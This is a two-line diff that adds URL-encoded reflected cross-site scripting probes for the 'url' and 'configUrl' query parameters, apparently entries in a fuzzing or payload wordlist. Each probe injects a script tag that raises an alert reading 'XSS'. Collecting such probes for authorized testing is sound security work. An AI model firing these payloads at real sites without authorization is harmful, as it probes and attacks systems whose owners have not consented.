@@ -1,0 +1,2 @@
+?url=%3Cscript%3Ealert(atob(%22WFNT%22))%3C/script%3E
+?configUrl=%3Cscript%3Ealert(atob(%22WFNT%22))%3C/script%3E
